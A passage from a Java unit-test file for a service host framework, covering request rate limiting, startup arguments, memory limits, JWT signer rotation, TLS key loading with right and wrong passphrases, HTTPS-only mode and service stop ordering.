this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n        this.host.start();\n\n        this.host.setSystemAuthorizationContext();\n\n        String userPath = UriUtils.buildUriPath(ServiceUriPaths.CORE_AUTHZ_USERS, \"example-user\");\n        String exampleUser = \"example@localhost\";\n        TestContext authCtx = this.host.testCreate(1);\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserSelfLink(userPath)\n                .setUserEmail(exampleUser)\n                .setUserPassword(exampleUser)\n                .setIsAdmin(false)\n                .setDocumentKind(Utils.buildKind(ExampleServiceState.class))\n                .setCompletion(authCtx.getCompletion())\n                .start();\n        authCtx.await();\n\n        this.host.resetAuthorizationContext();\n\n        this.host.assumeIdentity(userPath);\n\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = exampleUser;\n                    op.setBody(st);\n                }, factoryUri);\n\n        try {\n            RequestRateInfo ri = new RequestRateInfo();\n            this.host.setRequestRateLimit(userPath, ri);\n            throw new IllegalStateException(\"call should have failed, rate limit is zero\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        try {\n            RequestRateInfo ri = new RequestRateInfo();\n            // use a custom time series but of the wrong aggregation type\n            ri.timeSeries = new TimeSeriesStats(10,\n                    TimeUnit.SECONDS.toMillis(1),\n                    EnumSet.of(AggregationType.AVG));\n            this.host.setRequestRateLimit(userPath, ri);\n            throw new IllegalStateException(\"call should have failed, aggregation is not SUM\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        RequestRateInfo ri = new RequestRateInfo();\n        ri.limit = 1.1;\n        this.host.setRequestRateLimit(userPath, ri);\n        // verify no side effects on instance we supplied\n        assertTrue(ri.timeSeries == null);\n\n        double limit = (this.rateLimitedRequestCount * this.serviceCount) / 100;\n\n        // set limit for this user to 1 request / second, overwrite previous limit\n        this.host.setRequestRateLimit(userPath, limit);\n\n        ri = this.host.getRequestRateLimit(userPath);\n        assertTrue(Double.compare(ri.limit, limit) == 0);\n        assertTrue(!ri.options.isEmpty());\n        assertTrue(ri.options.contains(RequestRateInfo.Option.FAIL));\n        assertTrue(ri.timeSeries != null);\n        assertTrue(ri.timeSeries.numBins == 60);\n        assertTrue(ri.timeSeries.aggregationType.contains(AggregationType.SUM));\n\n        // set maintenance to default time to see how throttling behaves with default interval\n        this.host.setMaintenanceIntervalMicros(\n                ServiceHostState.DEFAULT_MAINTENANCE_INTERVAL_MICROS);\n\n        AtomicInteger failureCount = new AtomicInteger();\n        AtomicInteger successCount = new AtomicInteger();\n\n        // send N requests, at once, clearly violating the limit, and expect failures\n        int count = this.rateLimitedRequestCount;\n        TestContext ctx = this.host.testCreate(count * states.size());\n        ctx.setTestName(\"Rate limiting with failure\").logBefore();\n        CompletionHandler c = (o, e) -> {\n            if (e != null) {\n                if (o.getStatusCode() != Operation.STATUS_CODE_UNAVAILABLE) {\n                    ctx.failIteration(e);\n                    return;\n                }\n                failureCount.incrementAndGet();\n            } else {\n                successCount.incrementAndGet();\n            }\n\n            ctx.completeIteration();\n        };\n\n        ExampleServiceState patchBody = new ExampleServiceState();\n        patchBody.name = Utils.getSystemNowMicrosUtc() + \"\";\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(c);\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx);\n        ctx.logAfter();\n\n        assertTrue(failureCount.get() > 0);\n\n        // now change the options, and instead of fail, request throttling. this will literally\n        // throttle the HTTP listener (does not work on local, in process calls)\n\n        ri = new RequestRateInfo();\n        ri.limit = limit;\n        ri.options = EnumSet.of(RequestRateInfo.Option.PAUSE_PROCESSING);\n        this.host.setRequestRateLimit(userPath, ri);\n        this.host.assumeIdentity(userPath);\n\n        ServiceStat rateLimitStatBefore = getRateLimitOpCountStat();\n        if (rateLimitStatBefore == null) {\n            rateLimitStatBefore = new ServiceStat();\n            rateLimitStatBefore.latestValue = 0.0;\n        }\n        TestContext ctx2 = this.host.testCreate(count * states.size());\n        ctx2.setTestName(\"Rate limiting with auto-read pause of channels\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                // expect zero failures, but rate limit applied stat should have hits\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(ctx2.getCompletion());\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx2);\n        ctx2.logAfter();\n        ServiceStat rateLimitStatAfter = getRateLimitOpCountStat();\n        assertTrue(rateLimitStatAfter.latestValue > rateLimitStatBefore.latestValue);\n\n        this.host.setMaintenanceIntervalMicros(\n                TimeUnit.MILLISECONDS.toMicros(VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n\n        // effectively remove limit, verify all requests complete\n        ri = new RequestRateInfo();\n        ri.limit = 1000000;\n        ri.options = EnumSet.of(RequestRateInfo.Option.PAUSE_PROCESSING);\n        this.host.setRequestRateLimit(userPath, ri);\n        this.host.assumeIdentity(userPath);\n\n        count = this.rateLimitedRequestCount;\n        TestContext ctx3 = this.host.testCreate(count * states.size());\n        ctx3.setTestName(\"No limit\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                // expect zero failures\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(ctx3.getCompletion());\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx3);\n        ctx3.logAfter();\n\n        // verify rate limiting did not happen\n        ServiceStat rateLimitStatExpectSame = getRateLimitOpCountStat();\n        assertTrue(rateLimitStatAfter.latestValue == rateLimitStatExpectSame.latestValue);\n    }\n\n    @Test\n    public void postFailureOnAlreadyStarted() throws Throwable {\n        setUp(false);\n        Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                .toString());\n        this.host.testStart(1);\n        Operation post = Operation.createPost(s.getUri()).setCompletion(\n                (o, e) -> {\n                    if (e == null) {\n                        this.host.failIteration(new IllegalStateException(\n                                \"Request should have failed\"));\n                        return;\n                    }\n\n                    if (!(e instanceof ServiceAlreadyStartedException)) {\n                        this.host.failIteration(new IllegalStateException(\n                                \"Request should have failed with different exception\"));\n                        return;\n                    }\n                    this.host.completeIteration();\n                });\n        this.host.startService(post, new MinimalTestService());\n        this.host.testWait();\n    }\n\n    @Test\n    public void startUpWithArgumentsAndHostConfigValidation() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n        try {\n            String bindAddress = \"127.0.0.1\";\n            URI publicUri = new URI(\"http://somehost.com:1234\");\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().toURI(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--publicUri=\" + publicUri.toString(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n\n            // set memory limits for some services\n            double queryTasksRelativeLimit = 0.1;\n            double hostLimit = 0.29;\n            h.setServiceMemoryLimit(ServiceHost.ROOT_PATH, hostLimit);\n            h.setServiceMemoryLimit(ServiceUriPaths.CORE_QUERY_TASKS, queryTasksRelativeLimit);\n\n            // attempt to set limit that brings total > 1.0\n            try {\n                h.setServiceMemoryLimit(ServiceUriPaths.CORE_OPERATION_INDEX, 0.99);\n                throw new IllegalStateException(\"Should have failed\");\n            } catch (Throwable e) {\n\n            }\n\n            h.start();\n\n            assertTrue(UriUtils.isHostEqual(h, publicUri));\n            assertTrue(UriUtils.isHostEqual(h, new URI(\"http://127.0.0.1:\" + h.getPort())));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"https://somehost.com:\" + h.getPort())));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"http://somehost.com\")));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"http://somehost2.com:1234\")));\n\n            assertEquals(bindAddress, h.getPreferredAddress());\n\n            assertEquals(bindAddress, h.getUri().getHost());\n\n            assertEquals(hostId, h.getId());\n            assertEquals(publicUri, h.getPublicUri());\n\n            // confirm the node group self node entry uses the public URI for the bind address\n            NodeGroupState ngs = this.host.getServiceState(null, NodeGroupState.class,\n                    UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP));\n\n            NodeState selfEntry = ngs.nodes.get(h.getId());\n            assertEquals(publicUri.getHost(), selfEntry.groupReference.getHost());\n            assertEquals(publicUri.getPort(), selfEntry.groupReference.getPort());\n\n            // validate memory limits per service\n            long maxMemory = Runtime.getRuntime().maxMemory() / (1024 * 1024);\n            double hostRelativeLimit = hostLimit;\n            double indexRelativeLimit = ServiceHost.DEFAULT_PCT_MEMORY_LIMIT_DOCUMENT_INDEX;\n\n            long expectedHostLimitMB = (long) (maxMemory * hostRelativeLimit);\n            Long hostLimitMB = h.getServiceMemoryLimitMB(ServiceHost.ROOT_PATH,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected host limit outside bounds\",\n                    Math.abs(expectedHostLimitMB - hostLimitMB) < 10);\n\n            long expectedIndexLimitMB = (long) (maxMemory * indexRelativeLimit);\n            Long indexLimitMB = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_DOCUMENT_INDEX,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected index service limit outside bounds\",\n                    Math.abs(expectedIndexLimitMB - indexLimitMB) < 10);\n\n            long expectedQueryTaskLimitMB = (long) (maxMemory * queryTasksRelativeLimit);\n            Long queryTaskLimitMB = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected host limit outside bounds\",\n                    Math.abs(expectedQueryTaskLimitMB - queryTaskLimitMB) < 10);\n\n            // also check the water marks\n            long lowW = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.LOW_WATERMARK);\n            assertTrue(\"Expected  low watermark to be less than exact\",\n                    lowW < queryTaskLimitMB);\n\n            long highW = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.HIGH_WATERMARK);\n            assertTrue(\"Expected high watermark to be greater than low but less than exact\",\n                    highW > lowW && highW < queryTaskLimitMB);\n\n            // attempt to set the limit for a service after a host has started, it should fail\n            try {\n                h.setServiceMemoryLimit(ServiceUriPaths.CORE_OPERATION_INDEX, 0.2);\n                throw new IllegalStateException(\"Should have failed\");\n            } catch (Throwable e) {\n\n            }\n\n            // verify service host configuration file reflects command line arguments\n            File s = new File(h.getStorageSandbox());\n            s = new File(s, ServiceHost.SERVICE_HOST_STATE_FILE);\n\n            this.host.testStart(1);\n            ServiceHostState [] state = new ServiceHostState[1];\n            Operation get = Operation.createGet(h.getUri()).setCompletion((o, e) -> {\n                if (e != null) {\n                    this.host.failIteration(e);\n                    return;\n                }\n                state[0] = o.getBody(ServiceHostState.class);\n                this.host.completeIteration();\n            });\n            FileUtils.readFileAndComplete(get, s);\n            this.host.testWait();\n\n            assertEquals(h.getStorageSandbox(), state[0].storageSandboxFileReference);\n            assertEquals(h.getOperationTimeoutMicros(), state[0].operationTimeoutMicros);\n            assertEquals(h.getMaintenanceIntervalMicros(), state[0].maintenanceIntervalMicros);\n            assertEquals(bindAddress, state[0].bindAddress);\n            assertEquals(h.getPort(), state[0].httpPort);\n            assertEquals(hostId, state[0].id);\n\n            // now stop the host, change some arguments, restart, verify arguments override config\n            h.stop();\n\n            bindAddress = \"localhost\";\n            hostId = UUID.randomUUID().toString();\n\n            String [] args2 = {\n                    \"--port=\" + 0,\n                    \"--bindAddress=\" + bindAddress,\n                    \"--sandbox=\" + this.tmpFolder.getRoot().toURI(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args2);\n            h.start();\n\n            assertEquals(bindAddress, h.getState().bindAddress);\n            assertEquals(hostId, h.getState().id);\n\n            verifyAuthorizedServiceMethods(h);\n\n            verifyCoreServiceOption(h);\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    private void verifyCoreServiceOption(ExampleServiceHost h) {\n        List<URI> coreServices = new ArrayList<>();\n        URI defaultNodeGroup = UriUtils.buildUri(h, ServiceUriPaths.DEFAULT_NODE_GROUP);\n        URI defaultNodeSelector = UriUtils.buildUri(h, ServiceUriPaths.DEFAULT_NODE_SELECTOR);\n\n        coreServices.add(UriUtils.buildConfigUri(defaultNodeGroup));\n        coreServices.add(UriUtils.buildConfigUri(defaultNodeSelector));\n        coreServices.add(UriUtils.buildConfigUri(h.getDocumentIndexServiceUri()));\n        Map<URI, ServiceConfiguration> cfgs = this.host.getServiceState(null,\n                ServiceConfiguration.class, coreServices);\n        for (ServiceConfiguration c : cfgs.values()) {\n            assertTrue(c.options.contains(ServiceOption.CORE));\n        }\n    }\n\n    private void verifyAuthorizedServiceMethods(ServiceHost h) {\n        MinimalTestService s = new MinimalTestService();\n        try {\n            h.getAuthorizationContext(s, UUID.randomUUID().toString());\n            throw new IllegalStateException(\"call should have failed\");\n        } catch (IllegalStateException e) {\n            throw e;\n        } catch (RuntimeException e) {\n\n        }\n\n        try {\n            h.cacheAuthorizationContext(s,\n                    this.host.getGuestAuthorizationContext());\n            throw new IllegalStateException(\"call should have failed\");\n        } catch (IllegalStateException e) {\n            throw e;\n        } catch (RuntimeException e) {\n\n        }\n    }\n\n    @Test\n    public void setPublicUri() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n\n        try {\n\n            // try invalid arguments\n            ServiceHost.Arguments hostArgs = new ServiceHost.Arguments();\n            hostArgs.publicUri = \"\";\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            hostArgs = new ServiceHost.Arguments();\n            hostArgs.bindAddress = \"\";\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            hostArgs = new ServiceHost.Arguments();\n            hostArgs.port = -2;\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            String bindAddress = \"127.0.0.1\";\n            String publicAddress = \"10.1.1.19\";\n            int publicPort = 1634;\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().getAbsolutePath(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--publicUri=\" + new URI(\"http://\" + publicAddress + \":\" + publicPort),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n            h.start();\n\n            assertEquals(bindAddress, h.getPreferredAddress());\n\n            assertEquals(h.getPort(), h.getUri().getPort());\n            assertEquals(bindAddress, h.getUri().getHost());\n\n            // confirm that public URI takes precedence over bind address\n            assertEquals(publicAddress, h.getPublicUri().getHost());\n            assertEquals(publicPort, h.getPublicUri().getPort());\n\n            // confirm the node group self node entry uses the public URI for the bind address\n            NodeGroupState ngs = this.host.getServiceState(null, NodeGroupState.class,\n                    UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP));\n\n            NodeState selfEntry = ngs.nodes.get(h.getId());\n            assertEquals(publicAddress, selfEntry.groupReference.getHost());\n            assertEquals(publicPort, selfEntry.groupReference.getPort());\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void jwtSecret() throws Throwable {\n        setUp(false);\n\n        Claims claims = new Claims.Builder().setSubject(\"foo\").getResult();\n\n        Signer bogusSigner = new Signer(\"bogus\".getBytes());\n        Signer defaultSigner = this.host.getTokenSigner();\n        Verifier defaultVerifier = this.host.getTokenVerifier();\n\n        String signedByBogus = bogusSigner.sign(claims);\n        String signedByDefault = defaultSigner.sign(claims);\n\n        try {\n            defaultVerifier.verify(signedByBogus);\n            fail(\"Signed by bogusSigner should be invalid for defaultVerifier.\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n        Rfc7519Claims verified = defaultVerifier.verify(signedByDefault);\n        assertEquals(\"foo\", verified.getSubject());\n\n        this.host.stop();\n\n        // assign cert and private-key. private-key is used for JWT seed.\n        URI certFileUri = getClass().getResource(\"/ssl/server.crt\").toURI();\n        URI keyFileUri = getClass().getResource(\"/ssl/server.pem\").toURI();\n\n        this.host.setCertificateFileReference(certFileUri);\n        this.host.setPrivateKeyFileReference(keyFileUri);\n        // must assign port to zero, so we get a *new*, available port on restart.\n        this.host.setPort(0);\n        this.host.start();\n\n        Signer newSigner = this.host.getTokenSigner();\n        Verifier newVerifier = this.host.getTokenVerifier();\n\n        assertNotSame(\"new signer must be created\", defaultSigner, newSigner);\n        assertNotSame(\"new verifier must be created\", defaultVerifier, newVerifier);\n\n        try {\n            newVerifier.verify(signedByDefault);\n            fail(\"Signed by defaultSigner should be invalid for newVerifier\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n        // sign by newSigner\n        String signedByNewSigner = newSigner.sign(claims);\n\n        verified = newVerifier.verify(signedByNewSigner);\n        assertEquals(\"foo\", verified.getSubject());\n\n        try {\n            defaultVerifier.verify(signedByNewSigner);\n            fail(\"Signed by newSigner should be invalid for defaultVerifier\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n    }\n\n    @Test\n    public void startWithNonEncryptedPem() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server.pem\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n        } finally {\n            h.stop();\n        }\n\n        // with wrong password\n        args = new String[] {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=WRONG_PASSWORD\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start with password for non-encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void startWithEncryptedPem() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server-with-pass.p8\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=password\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n        } finally {\n            h.stop();\n        }\n\n        // with wrong password\n        args = new String[] {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=WRONG_PASSWORD\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start with wrong password for encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n        // with no password\n        args = new String[] {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start when no password is specified for encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void httpsOnly() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server.pem\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        // set -1 to disable http\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=-1\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n\n            assertNull(\"http should be disabled\", h.getListener());\n            assertNotNull(\"https should be enabled\", h.getSecureListener());\n        } finally {\n            h.stop();\n        }\n    }\n\n\n    @Test\n    public void setAuthEnforcement() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n        try {\n            String bindAddress = \"127.0.0.1\";\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().getAbsolutePath(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--isAuthorizationEnabled=\" + Boolean.TRUE.toString(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n            assertTrue(h.isAuthorizationEnabled());\n            h.setAuthorizationEnabled(false);\n            assertFalse(h.isAuthorizationEnabled());\n            h.setAuthorizationEnabled(true);\n            h.start();\n\n            this.host.testStart(1);\n            h.sendRequest(Operation\n                    .createGet(UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP))\n                    .setReferer(this.host.getReferer())\n                    .setCompletion((o, e) -> {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_FORBIDDEN) {\n                            this.host.completeIteration();\n                            return;\n                        }\n                        this.host.failIteration(new IllegalStateException(\n                                \"Op succeded when failure expected\"));\n                    }));\n            this.host.testWait();\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void serviceStartExpiration() throws Throwable {\n        setUp(false);\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(100);\n        // set a small period so its pretty much guaranteed to execute\n        // maintenance during this test\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n\n        // start a service but tell it to not complete the start POST. This will induce a timeout\n        // failure from the host\n\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = MinimalTestService.STRING_MARKER_TIMEOUT_REQUEST;\n        this.host.testStart(1);\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, UUID.randomUUID().toString()))\n                .setExpiration(Utils.fromNowMicrosUtc(maintenanceIntervalMicros))\n                .setBody(initialState)\n                .setCompletion(this.host.getExpectedFailureCompletion());\n        this.host.startService(startPost, new MinimalTestService());\n        this.host.testWait();\n    }\n\n    @Test\n    public void startServiceSelfLinkWithStar() throws Throwable {\n        setUp(false);\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = this.host.nextUUID();\n        TestContext ctx = this.host.testCreate(1);\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, this.host.nextUUID() + \"*\"))\n                .setBody(initialState).setCompletion(ctx.getExpectedFailureCompletion());\n        this.host.startService(startPost, new MinimalTestService());\n        this.host.testWait(ctx);\n    }\n\n    public static class StopOrderTestService extends StatefulService {\n\n        public int stopOrder;\n\n        public AtomicInteger globalStopOrder;\n\n        public StopOrderTestService() {\n            super(MinimalTestServiceState.class);\n        }\n\n        @Override\n        public void handleStop(Operation delete) {\n            this.stopOrder = this.globalStopOrder.incrementAndGet();\n            delete.complete();\n        }\n\n    }\n\n    public static class PrivilegedStopOrderTestService extends StatefulService {\n\n        public int stopOrder;\n\n        public AtomicInteger globalStopOrder;\n\n        public PrivilegedStopOrderTestService() {\n            super(MinimalTestServiceState.class);\n        }\n\n        @Override\n        public void handleStop(Operation delete) {\n            this.stopOrder = this.globalStopOrder.incrementAndGet();\n            delete.complete();\n        }\n\n    }\n\n    @Test\n    public void serviceStopOrder() throws Throwable {\n        setUp(false);\n\n        // start a service but tell it to not complete the start POST. This will induce a timeout\n        // failure from the host\n\n        int serviceCount = 10;\n        AtomicInteger order = new AtomicInteger(0);\n        this.host.testStart(serviceCount);\n        List<StopOrderTestService> normalServices = new ArrayList<>();\n        for (int i = 0; i < serviceCount; i++) {\n            MinimalTestServiceState initialState = new MinimalTestServiceState();\n            initialState.id = UUID.randomUUID().toString();\n            StopOrderTestService normalService = new StopOrderTestService();\n            normalServices.add(normalService);\n            normalService.globalStopOrder = order;\n            Operation post = Operation.createPost(UriUtils.buildUri(this.host, initialState.id))\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.startService(post, normalService);\n        }\n        this.host.testWait();\n\n\n        this.host.addPrivilegedService(PrivilegedStopOrderTestService.class);\n        List<PrivilegedStopOrderTestService> pServices = new ArrayList<>();\n        this.host.testStart(serviceCount);\n        for (int i = 0; i < serviceCount; i++) {\n            MinimalTestServiceState initialState = new MinimalTestServiceState();\n            initialState.id = UUID.randomUUID().toString();\n            PrivilegedStopOrderTestService ps = new PrivilegedStopOrderTestService();\n            pServices.add(ps);\n            ps.globalStopOrder = order;\n            Operation post = Operation.createPost(UriUtils.buildUri(this.host, initialState.id))\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.startService(post, ps);\n        }\n        this.host.testWait();\n\n        this.host.stop();\n\n        for (PrivilegedStopOrderTestService pService : pServices) {\n            for (StopOrderTestService normalService : normalServices) {\n                this.host.log(\"normal order: %d, privileged: %d\", normalService.stopOrder,\n                        pService.stopOrder);\n                assertTrue(normalService.stopOrder < pService.stopOrder);\n            }\n        }\n    }\n\n    @Test\n    public void maintenanceAndStatsReporting() throws Throwable {\n        CommandLineArgumentParser.parseFromProperties(this);\n        for (int i = 0; i < this.iterationCount; i++) {\n            this.tearDown();\n            doMaintenanceAndStatsReporting();\n        }\n    }\n\n    private void doMaintenanceAndStatsReporting() throws Throwable {\n        setUp(true);\n\n        // induce host to clear service state cache by setting mem limit low\n        this.host.setServiceMemoryLimit(ServiceHost.ROOT_PATH, 0.0001);\n        this.host.setServiceMemoryLimit(LuceneDocumentIndexService.SELF_LINK, 0.0001);\n        long maintIntervalMillis = 100;\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(maintIntervalMillis);\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.MILLISECONDS\n                .toMicros(maintIntervalMillis / 2));\n        this.host.start();\n\n        verifyMaintenanceDelayStat(maintenanceIntervalMicros);\n\n        long opCount = 2;\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.INSTRUMENTATION, ServiceOption.PERIODIC_MAINTENANCE);\n\n        List<Service> services = this.host.doThroughputServiceStart(\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null);\n\n        long start = System.nanoTime() / 1000;\n        List<Service> slowMaintServices = this.host.doThroughputServiceStart(null,\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null, maintenanceIntervalMicros * 10);\n\n        List<URI> uris = new ArrayList<>();\n        for (Service s : services) {\n            uris.add(s.getUri());\n        }\n\n        this.host.doPutPerService(opCount, EnumSet.of(TestProperty.FORCE_REMOTE),\n                services);\n\n        long cacheMissCount = 0;\n        long cacheClearCount = 0;\n        ServiceStat cacheClearStat = null;\n        Map<URI, ServiceStats> servicesWithMaintenance = new HashMap<>();\n\n        double maintCount = getHostMaintenanceCount();\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > maintCount + 10;\n        });\n\n        Date exp = this.host.getTestExpiration();\n        while (new Date().before(exp)) {\n            // issue GET to actually make the cache miss occur (if the cache has been cleared)\n            this.host.getServiceState(null, MinimalTestServiceState.class, uris);\n\n            // verify each service show at least a couple of maintenance requests\n            URI[] statUris = buildStatsUris(this.serviceCount, services);\n            Map<URI, ServiceStats> stats = this.host.getServiceState(null,\n                    ServiceStats.class, statUris);\n\n            for (Entry<URI, ServiceStats> e : stats.entrySet()) {\n                long maintFailureCount = 0;\n                ServiceStats s = e.getValue();\n\n                for (ServiceStat st : s.entries.values()) {\n\n                    if (st.name.equals(Service.STAT_NAME_CACHE_MISS_COUNT)) {\n                        cacheMissCount += (long) st.latestValue;\n                        continue;\n                    }\n\n                    if (st.name.equals(Service.STAT_NAME_CACHE_CLEAR_COUNT)) {\n                        cacheClearCount += (long) st.latestValue;\n                        continue;\n                    }\n                    if 